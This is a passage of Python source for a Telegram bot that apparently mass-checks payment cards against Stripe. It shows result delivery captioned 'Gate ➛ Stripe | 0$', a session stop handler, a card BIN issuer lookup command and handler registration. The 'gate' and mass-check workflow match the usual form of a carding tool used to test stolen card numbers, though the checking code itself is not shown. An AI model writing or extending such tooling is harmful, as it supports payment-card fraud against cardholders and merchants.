    user_msg_id = sess.get("user_msg_id")

    try:
        await context.bot.send_document(
            chat_id=query.message.chat.id,
            document=InputFile(buf, filename=fn),
            caption=(
                f"<b>Result ➛ {rtype.capitalize()}</b>\n"
                f"<b>Total ➛ {count}</b>\n"
                f"<b>Gate ➛ Stripe | 0$</b>"
            ),
            parse_mode="HTML",
            reply_to_message_id=user_msg_id,
        )
    except BadRequest as e:
        if "message to reply not found" in str(e).lower():
            buf.seek(0)
            await context.bot.send_document(
                chat_id=query.message.chat.id,
                document=InputFile(buf, filename=fn),
                caption=(
                    f"<b>Result ➛ {rtype.capitalize()}</b>\n"
                    f"<b>Total ➛ {count}</b>\n"
                    f"<b>Gate ➛ Stripe | 0$</b>"
                ),
                parse_mode="HTML",
            )
        else:
            logging.error(f"[MST] send_document error: {e}")
    except Exception as e:
        logging.error(f"[MST] send_document error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK: stop session
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cb_mst_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    sid   = query.data.split(":")[-1]   # msts:<sid>
    sess  = MST_SESSIONS.get(sid)

    if not sess and MST_COMPLETED.get(sid):
        await query.answer("ℹ️ Session already finished.", show_alert=True); return
    if not sess:
        await query.answer("⚠️ Session not found.", show_alert=True); return
    if query.from_user.id != sess.get("user_id"):
        await query.answer("❌ Not your session.", show_alert=True); return
    if _is_locked(sid):
        remaining = _lock_remaining(sid)
        await query.answer(f"⏳ Wait {remaining}s before stopping.", show_alert=True); return
    if sess["status"] != "CHECKING":
        await query.answer("ℹ️ Not running.", show_alert=True); return

    sess["status"] = "STOPPED"
    cancelled = 0
    for t in MST_TASKS.get(sid, []):
        if not t.done():
            t.cancel()
            cancelled += 1
    logging.info(f"🛑 [MST] Stop: {sid} — cancelled {cancelled} tasks")
    await query.answer("🛑 Stopped.")
    try:
        await _update_progress(context.bot, sid, force=True)
    except Exception:
        pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /bin  — BIN Lookup
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cmd_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text(
            "<b>BIN Lookup</b>\nUsage: <code>/bin 411111</code>",
            parse_mode="HTML",
        )
        return

    bin6 = args[0].strip()[:8]
    if not bin6.isdigit() or len(bin6) < 6:
        await update.message.reply_text("❌ Enter a valid 6-digit BIN.", parse_mode="HTML")
        return

    wait_msg = await update.message.reply_text(
        f"🔄 Looking up BIN <code>{bin6}</code>…", parse_mode="HTML",
    )

    try:
        info = await asyncio.wait_for(get_bin_info(bin6), timeout=10)
    except Exception:
        info = {}

    if not info:
        await wait_msg.edit_text(
            f"❌ No info found for BIN <code>{bin6}</code>.", parse_mode="HTML"
        )
        return

    brand    = str(info.get("brand",    info.get("scheme",       "Unknown"))).upper()
    ctype    = str(info.get("type",     "Unknown")).upper()
    level    = str(info.get("level",    info.get("category", ""))).upper()
    bank     = info.get("bank",         info.get("issuer", "Unknown"))
    country  = info.get("country",      info.get("country_name", "Unknown"))
    flag     = info.get("flag",         info.get("emoji", ""))
    currency = info.get("currency", "")

    level_str    = f" | {level}"    if level    else ""
    currency_str = f" | {currency}" if currency else ""
    flag_str     = f" {flag}"       if flag     else ""

    text = (
        f"<b>💳 BIN Lookup</b>\n\n"
        f"<b>BIN     ➛</b> <code>{bin6}</code>\n"
        f"<b>Brand   ➛</b> {html_escape(brand)}\n"
        f"<b>Type    ➛</b> {html_escape(ctype)}{html_escape(level_str)}\n"
        f"<b>Bank    ➛</b> {html_escape(str(bank))}\n"
        f"<b>Country ➛</b> {html_escape(str(country))}{flag_str}{html_escape(currency_str)}\n\n"
        f"<b>⚡ ➛ {DEV_LINK}</b>"
    )

    try:
        await wait_msg.edit_text(text, parse_mode="HTML", disable_web_page_preview=True)
    except Exception:
        await update.message.reply_text(text, parse_mode="HTML", disable_web_page_preview=True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HANDLER EXPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_mst_handlers():
    return [
        CommandHandler("mst",              cmd_mst),
        CallbackQueryHandler(cb_mst_result, pattern=r"^mstr:"),
        CallbackQueryHandler(cb_mst_stop,   pattern=r"^msts:"),
    ]

def get_bin_handler():
    """Returns the /bin CommandHandler — imported by main.py as get_bin_lookup_handler."""
    return CommandHandler("bin", cmd_bin)
